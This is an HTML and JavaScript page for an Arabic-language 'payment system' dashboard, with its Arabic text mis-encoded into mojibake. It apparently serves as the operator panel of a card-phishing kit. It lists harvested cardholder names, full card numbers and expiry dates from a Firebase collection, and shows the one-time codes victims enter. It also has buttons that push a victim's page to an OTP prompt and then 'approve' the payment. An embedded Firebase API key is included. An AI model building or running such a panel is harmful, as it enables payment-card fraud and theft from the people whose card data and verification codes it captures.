<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø§Øª Ø§Ù„Ù…Ø³Ø¬Ù„Ø©</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #1a56db;
            --bg: #f9fafb;
            --white: #ffffff;
            --border: #e5e7eb;
        }
        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); margin: 0; padding: 20px; }
        .container { max-width: 1100px; margin: 0 auto; }
        
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: var(--white); padding: 20px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); display: flex; align-items: center; gap: 15px; }
        .stat-card i { font-size: 24px; color: var(--primary); }
        .stat-val { font-size: 22px; font-weight: bold; display: block; }
        .stat-label { color: #6b7280; font-size: 14px; }

        .table-container { background: var(--white); border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 20px; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; text-align: right; }
        th { padding: 15px; border-bottom: 2px solid var(--border); color: #374151; }
        td { padding: 15px; border-bottom: 1px solid var(--border); }
        
        .badge { padding: 4px 10px; border-radius: 6px; font-size: 12px; font-weight: 600; }
        .badge-visa { background: #eef2ff; color: #4338ca; }
        .badge-master { background: #fff7ed; color: #9a3412; }
        .badge-mada { background: #f0fdf4; color: #166534; }
        .badge-amex { background: #eff6ff; color: #1d4ed8; }
        
        .status-pending { color: #f59e0b; font-weight: bold; }
        .status-success { color: #10b981; font-weight: bold; }
        .status-error { color: #ef4444; font-weight: bold; }
        .status-otp_required { 
            color: #8b5cf6; 
            font-weight: bold; 
            background-color: #f5f3ff; 
            padding: 4px 10px; 
            border-radius: 6px;
            animation: pulse 2s infinite;
        }
        .status-otp_sent { 
            color: #3b82f6; 
            font-weight: bold; 
            background-color: #eff6ff; 
            padding: 4px 10px; 
            border-radius: 6px;
        }
        
        .action-buttons { display: flex; gap: 8px; flex-wrap: wrap; }
        .action-btn { 
            background: none; 
            border: none; 
            cursor: pointer; 
            font-size: 16px; 
            padding: 6px 10px; 
            border-radius: 6px; 
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        .action-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        
        .btn-success { color: #10b981; background-color: #f0fdf4; }
        .btn-success:hover { background-color: #dcfce7; }
        
        .btn-otp { color: #8b5cf6; background-color: #f5f3ff; }
        .btn-otp:hover { background-color: #ede9fe; }
        
        .btn-error { color: #ef4444; background-color: #fef2f2; }
        .btn-error:hover { background-color: #fee2e2; }
        
        .btn-delete { color: #6b7280; background-color: #f3f4f6; }
        .btn-delete:hover { background-color: #e5e7eb; }
        
        .otp-code-display {
            background: #dbeafe;
            color: #1e40af;
            padding: 6px 12px;
            border-radius: 6px;
            font-weight: bold;
            font-size: 16px;
            letter-spacing: 2px;
            margin-right: 5px;
        }
        
        .user-notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #10b981;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            display: none;
            z-index: 1000;
            animation: slideIn 0.3s ease-out;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(139, 92, 246, 0.4); }
            70% { box-shadow: 0 0 0 6px rgba(139, 92, 246, 0); }
            100% { box-shadow: 0 0 0 0 rgba(139, 92, 246, 0); }
        }
        
        .card-info { 
            background: #f8fafc; 
            padding: 12px; 
            border-radius: 8px; 
            margin: 5px 0; 
            border-right: 3px solid var(--primary);
            font-size: 14px;
        }
        
        .card-info div { margin-bottom: 5px; }
        .card-info div:last-child { margin-bottom: 0; }
        
        .timestamp {
            font-size: 12px;
            color: #6b7280;
            background: #f3f4f6;
            padding: 4px 8px;
            border-radius: 4px;
            display: inline-block;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
            <h1><i class="fa-solid fa-database"></i> Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… - Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯ÙØ¹</h1>
            <div style="display: flex; gap: 10px;">
                <button onclick="location.reload()" style="padding: 8px 16px; background: #fff; border: 1px solid var(--border); border-radius: 8px; cursor: pointer;">
                    <i class="fa-solid fa-rotate"></i> ØªØ­Ø¯ÙŠØ«
                </button>
                <button onclick="showHelp()" style="padding: 8px 16px; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer;">
                    <i class="fa-solid fa-question-circle"></i> Ù…Ø³Ø§Ø¹Ø¯Ø©
                </button>
            </div>
        </header>

        <div class="stats-grid">
            <div class="stat-card"><i class="fa-solid fa-credit-card"></i><div><span class="stat-val" id="total-count">0</span><span class="stat-label">Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø§Øª</span></div></div>
            <div class="stat-card"><i class="fa-solid fa-hourglass-half"></i><div><span class="stat-val" id="pending-count">0</span><span class="stat-label">Ù‚ÙŠØ¯ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±</span></div></div>
            <div class="stat-card"><i class="fa-solid fa-key"></i><div><span class="stat-val" id="otp-count">0</span><span class="stat-label">Ù…Ø·Ù„ÙˆØ¨ OTP</span></div></div>
            <div class="stat-card"><i class="fa-solid fa-check-circle"></i><div><span class="stat-val" id="verified-count">0</span><span class="stat-label">Ù…ÙƒØªÙ…Ù„</span></div></div>
        </div>

        <div class="table-container">
            <div id="loading" class="loader"><i class="fas fa-spinner fa-spin"></i> Ø¬Ø§Ø±ÙŠ Ø¬Ù„Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Firebase...</div>
            <table id="cards-table" style="display: none;">
                <thead>
                    <tr>
                        <th>Ø§Ù„Ù†ÙˆØ¹</th>
                        <th>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</th>
                        <th>ØªØ§Ø±ÙŠØ® Ø§Ù„ØªØ³Ø¬ÙŠÙ„</th>
                        <th>Ø§Ù„Ø­Ø§Ù„Ø©</th>
                        <th>Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª</th>
                    </tr>
                </thead>
                <tbody id="table-body"></tbody>
            </table>
        </div>
    </div>
    
    <div id="user-notification" class="user-notification">
        <i class="fa-solid fa-check-circle"></i> ØªÙ… ØªÙ†Ø¨ÙŠÙ‡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù„Ø·Ù„Ø¨ Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ù…Ù„ÙƒÙŠØ©
    </div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
    import { getFirestore, collection, getDocs, deleteDoc, doc, query, orderBy, updateDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyDuTdRONBY01xWrf9qZ81C2UQHg1V-64to",
        authDomain: "vasa-a14ca.firebaseapp.com",
        projectId: "vasa-a14ca",
        storageBucket: "vasa-a14ca.firebasestorage.app",
        messagingSenderId: "1083668938512",
        appId: "1:1083668938512:web:7624c955c0c54d3f7bef95",
        measurementId: "G-1ESJ0J0TZW"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    async function loadCards() {
        const tableBody = document.getElementById('table-body');
        const loading = document.getElementById('loading');
        const table = document.getElementById('cards-table');
        
        let stats = { total: 0, pending: 0, otp_required: 0, verified: 0 };

        try {
            const q = query(collection(db, "cards"), orderBy("createdAt", "desc"));
            const querySnapshot = await getDocs(q);
            
            tableBody.innerHTML = "";
            
            querySnapshot.forEach((docSnap) => {
                const data = docSnap.data();
                const id = docSnap.id;
                stats.total++;
                
                if (data.status === 'pending') stats.pending++;
                if (data.status === 'otp_required' || data.status === 'otp_sent') stats.otp_required++;
                if (data.status === 'success') stats.verified++;

                const date = data.createdAt ? data.createdAt.toDate().toLocaleString('ar-EG') : 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯';
                const verificationTime = data.verificationTime || '';
                
                let statusText = '';
                let statusClass = 'status-' + (data.status || 'pending');
                
                switch(data.status) {
                    case 'pending':
                        statusText = 'â³ Ù‚ÙŠØ¯ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±';
                        break;
                    case 'otp_required':
                        statusText = 'ğŸ”‘ Ù…Ø·Ù„ÙˆØ¨ Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ù…Ù„ÙƒÙŠØ©';
                        break;
                    case 'otp_sent':
                        statusText = data.otp ? 
                            `ğŸ“¨ ØªÙ… Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯: <span class="otp-code-display">${data.otp}</span>` : 
                            'ğŸ“¨ ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯';
                        if (verificationTime) {
                            statusText += `<div class="timestamp">${verificationTime}</div>`;
                        }
                        break;
                    case 'success':
                        statusText = 'âœ… ØªÙ… Ø§Ù„Ø¯ÙØ¹ Ø¨Ù†Ø¬Ø§Ø­';
                        if (data.verifiedAt) {
                            statusText += `<div class="timestamp">${data.verifiedAt}</div>`;
                        }
                        break;
                    case 'error':
                        statusText = 'âŒ ÙØ´Ù„ Ø§Ù„Ø¯ÙØ¹';
                        break;
                    default:
                        statusText = 'â³ Ù‚ÙŠØ¯ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±';
                }

                const row = `
                    <tr id="row-${id}">
                        <td>
                            <span class="badge badge-${data.cardType || 'visa'}">
                                ${(data.cardType || 'visa').toUpperCase()}
                            </span>
                        </td>
                        <td>
                            <div class="card-info">
                                <div><strong>Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:</strong> ${data.cardHolder || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯'}</div>
                                <div><strong>Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:</strong> <span dir="ltr">${data.cardNumber || 'ØºÙŠØ± Ù…ØªÙˆÙØ±'}</span></div>
                                <div><strong>ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡:</strong> ${data.expiryDate || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯'}</div>
                            </div>
                        </td>
                        <td>${date}</td>
                        <td id="status-${id}" class="${statusClass}">${statusText}</td>
                        <td>
                            <div class="action-buttons">
                                ${(data.status === 'pending' || data.status === 'otp_sent') ? `
                                    <button onclick="approvePayment('${id}')" class="action-btn btn-success" title="Ù‚Ø¨ÙˆÙ„ Ø§Ù„Ø¯ÙØ¹">
                                        <i class="fa-solid fa-check-circle"></i> Ù‚Ø¨ÙˆÙ„
                                    </button>
                                ` : ''}
                                
                                ${(!data.status || data.status === 'pending') ? `
                                    <button onclick="requestOTP('${id}')" class="action-btn btn-otp" title="Ø·Ù„Ø¨ Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ù…Ù„ÙƒÙŠØ©">
                                        <i class="fa-solid fa-key"></i> Ø·Ù„Ø¨ OTP
                                    </button>
                                ` : ''}
                                
                                ${(data.status === 'otp_sent' && data.otp) ? `
                                    <button onclick="rejectOTP('${id}')" class="action-btn btn-error" title="Ø±ÙØ¶ Ø§Ù„ÙƒÙˆØ¯">
                                        <i class="fa-solid fa-times-circle"></i> Ø±ÙØ¶
                                    </button>
                                ` : (data.status !== 'success' && data.status !== 'error') ? `
                                    <button onclick="rejectPayment('${id}')" class="action-btn btn-error" title="Ø±ÙØ¶ Ø§Ù„Ø¯ÙØ¹">
                                        <i class="fa-solid fa-times-circle"></i> Ø±ÙØ¶
                                    </button>
                                ` : ''}
                                
                                <button onclick="deleteCard('${id}')" class="action-btn btn-delete" title="Ø­Ø°Ù">
                                    <i class="fa-solid fa-trash-can"></i>
                                </button>
                            </div>
                        </td>
                    </tr>
                `;
                tableBody.innerHTML += row;
            });

            document.getElementById('total-count').innerText = stats.total;
            document.getElementById('pending-count').innerText = stats.pending;
            document.getElementById('otp-count').innerText = stats.otp_required;
            document.getElementById('verified-count').innerText = stats.verified;

            loading.style.display = 'none';
            table.style.display = 'table';

        } catch (error) {
            console.error("Error: ", error);
            loading.innerText = "ÙØ´Ù„ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª. ØªØ£ÙƒØ¯ Ù…Ù† Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firestore.";
        } 
    }

    window.requestOTP = async (id) => {
        if (confirm("Ù‡Ù„ ØªØ±ÙŠØ¯ Ø·Ù„Ø¨ Ø¥Ø«Ø¨Ø§Øª Ù…Ù„ÙƒÙŠØ© Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ØŸ")) {
            try {
                await updateDoc(doc(db, "cards", id), { 
                    status: 'otp_required',
                    otpRequestTime: new Date().toLocaleString('ar-EG')
                });
                
                // Ø¥Ø¸Ù‡Ø§Ø± Ø¥Ø´Ø¹Ø§Ø± Ù„Ù„Ù…Ø³Ø¤ÙˆÙ„
                showNotification();
                
                alert("ØªÙ… Ø·Ù„Ø¨ Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ù…Ù„ÙƒÙŠØ© Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…. Ø³ØªØªØ­ÙˆÙ„ ØµÙØ­ØªÙ‡ ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§ Ø¥Ù„Ù‰ ÙˆØ§Ø¬Ù‡Ø© Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ù…Ù„ÙƒÙŠØ©.");
                loadCards();
            } catch (error) {
                alert("Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨: " + error.message);
            }
        }
    };

    window.approvePayment = async (id) => {
        if (confirm("Ù‡Ù„ ØªØ±ÙŠØ¯ Ù‚Ø¨ÙˆÙ„ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø¯ÙØ¹ØŸ")) {
            try {
                await updateDoc(doc(db, "cards", id), { 
                    status: 'success',
                    verifiedAt: new Date().toLocaleString('ar-EG'),
                    verifiedBy: 'Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„'
                });
                
                alert("ØªÙ… Ù‚Ø¨ÙˆÙ„ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø¯ÙØ¹ Ø¨Ù†Ø¬Ø§Ø­!");
                loadCards();
            } catch (error) {
                alert("Ø®Ø·Ø£ ÙÙŠ Ù‚Ø¨ÙˆÙ„ Ø§Ù„Ø¯ÙØ¹: " + error.message);
            }
        }
    };

    window.rejectOTP = async (id) => {
        if (confirm("Ù‡Ù„ ØªØ±ÙŠØ¯ Ø±ÙØ¶ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ ÙˆØ¥Ø¹Ø§Ø¯Ø© Ø·Ù„Ø¨ Ø±Ù…Ø² Ø¬Ø¯ÙŠØ¯ØŸ")) {
            try {
                await updateDoc(doc(db, "cards", id), { 
                    status: 'pending',
                    otp: null
                });
                
                alert("ØªÙ… Ø±ÙØ¶ Ø§Ù„Ø±Ù…Ø². ÙŠÙ…ÙƒÙ† Ø·Ù„Ø¨ Ø±Ù…Ø² Ø¬Ø¯ÙŠØ¯ Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù….");
                loadCards();
            } catch (error) {
                alert("Ø®Ø·Ø£ ÙÙŠ Ø±ÙØ¶ Ø§Ù„Ø±Ù…Ø²: " + error.message);
            }
        }
    };

    window.rejectPayment = async (id) => {
        if (confirm("Ù‡Ù„ ØªØ±ÙŠØ¯ Ø±ÙØ¶ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø¯ÙØ¹ØŸ")) {
            try {
                await updateDoc(doc(db, "cards", id), { 
                    status: 'error',
                    rejectionTime: new Date().toLocaleString('ar-EG')
                });
                
                alert("ØªÙ… Ø±ÙØ¶ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø¯ÙØ¹.");
                loadCards();
            } catch (error) {
                alert("Ø®Ø·Ø£ ÙÙŠ Ø±ÙØ¶ Ø§Ù„Ø¯ÙØ¹: " + error.message);
            }
        }
    };

    window.deleteCard = async (id) => {
        if (confirm("Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø°Ù Ù‡Ø°Ù‡ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©ØŸ")) {
            try {
                await deleteDoc(doc(db, "cards", id));
                alert("ØªÙ… Ø§Ù„Ø­Ø°Ù Ø¨Ù†Ø¬Ø§Ø­");
                loadCards();
            } catch (error) {
                alert("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø­Ø°Ù: " + error.message);
            }
        }
    };

    function showNotification() {
        const notification = document.getElementById('user-notification');
        notification.style.display = 'block';
        
        setTimeout(() => {
            notification.style.display = 'none';
        }, 3000);
    }

    function showHelp() {
        alert(`Ø¯Ù„ÙŠÙ„ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù†Ø¸Ø§Ù…:
        
1. Ù‚ÙŠØ¯ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± â³: Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ø±Ø³Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø·Ø§Ù‚ØªÙ‡
2. Ø·Ù„Ø¨ OTP ğŸ”‘: Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø²Ø± "Ø·Ù„Ø¨ OTP" Ù„ØªØ­ÙˆÙŠÙ„ ØµÙØ­Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¥Ù„Ù‰ Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ù…Ù„ÙƒÙŠØ©
3. ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯ ğŸ“¨: Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ (ÙŠØ¸Ù‡Ø± Ø§Ù„Ø±Ù…Ø²)
4. âœ… Ù‚Ø¨ÙˆÙ„: Ù„Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø¯ÙØ¹ Ø¨Ø¹Ø¯ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø±Ù…Ø²
5. âŒ Ø±ÙØ¶: Ù„Ø±ÙØ¶ Ø§Ù„Ø¯ÙØ¹ Ø£Ùˆ Ø±ÙØ¶ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚
        
Ø§Ù„Ø¹Ù…Ù„ÙŠØ§Øª ØªØ­Ø¯Ø« Ù„Ø­Ø¸ÙŠÙ‹Ø§ Ø¯ÙˆÙ† Ø§Ù„Ø­Ø§Ø¬Ø© Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØµÙØ­Ø©!`);
    }

    loadCards();
</script>
</body>
</html>
